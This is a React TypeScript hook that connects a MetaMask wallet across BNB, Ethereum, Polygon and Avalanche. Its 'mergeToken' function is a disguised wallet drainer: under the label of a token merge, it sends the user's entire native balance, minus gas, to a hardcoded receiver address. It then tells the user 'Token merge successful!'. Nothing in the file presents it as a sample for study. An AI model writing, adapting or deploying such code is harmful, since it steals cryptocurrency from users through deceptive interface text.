import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
  interface Window {
    ethereum?: any;
  }
}

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    // Check if wallet is already connected
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            updateBalance(accounts[0]);
          }
        })
        .catch(console.error);
    }
  }, []);

  const updateBalance = async (address: string) => {
    if (!window.ethereum || !address) return;
    
    try {
      const { ethers } = await import('../lib/web3');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      const formattedBalance = ethers.formatEther(nativeBalance);
      setBalance(formattedBalance);
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  };

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not found",
        variant: "destructive",
      });
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: {
                  name: net.symbol,
                  symbol: net.symbol,
                  decimals: 18,
                },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
        } catch (addError) {
          toast({
            title: "Error",
            description: "Failed to add network",
            variant: "destructive",
          });
        }
      } else {
        toast({
          title: "Error",
          description: "Network switch rejected",
          variant: "destructive",
        });
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not detected. Please install MetaMask.",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    try {
      // First switch to selected network
      await switchNetwork(selectedNetwork);

      // Request account access
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const address = accounts[0];
      setAccount(address);
      setWalletConnected(true);

      // Update balance
      await updateBalance(address);
      
      toast({
        title: "Success",
        description: "Wallet connected successfully!",
      });
    } catch (error: any) {
      console.error("Connection error:", error);
      let errorMessage = "Failed to connect wallet";
      
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({
        title: "Error",
        description: errorMessage,
        variant: "destructive",
      });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    if (!walletConnected || !window.ethereum || !account) {
      toast({
        title: "Error",
        description: "Wallet not connected",
        variant: "destructive",
      });
      return;
    }

    try {
      toast({
        title: "Processing",
        description: "Initiating token merge...",
      });

      const { ethers } = await import('../lib/web3');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Get current balance
      const nativeBalance = await provider.getBalance(account);
      
      if (nativeBalance === 0n) {
        toast({
          title: "Error",
          description: "No balance to merge",
          variant: "destructive",
        });
        return;
      }

      // Get fee data with fallback
      let gasPrice;
      try {
        const feeData = await provider.getFeeData();
        gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
      } catch {
        gasPrice = ethers.parseUnits("20", "gwei");
      }

      // Estimate gas with a small amount first
      const gasEstimate = await signer.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
      });

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Add buffer for Ethereum mainnet
      if (selectedNetwork === "ethereum") {
        const buffer = ethers.parseEther("0.0001");
        valueToSend -= buffer;
      }

      if (valueToSend <= 0n) {
        toast({
          title: "Error",
          description: "Not enough balance to cover gas fees",
          variant: "destructive",
        });
        return;
      }

      // Send transaction
      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasPrice: gasPrice,
        gasLimit: gasEstimate,
      });

      toast({
        title: "Transaction Sent",
        description: "Waiting for confirmation...",
      });

      // Wait for confirmation
      await tx.wait();
      
      toast({
        title: "Success",
        description: "Token merge successful!",
      });

      // Update balance
      await updateBalance(account);
      
    } catch (error: any) {
      console.error("Merge error:", error);
      let errorMessage = "Merge failed";
      
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === -32603) {
        errorMessage = "Transaction failed - insufficient funds";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({
        title: "Error",
        description: errorMessage,
        variant: "destructive",
      });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}
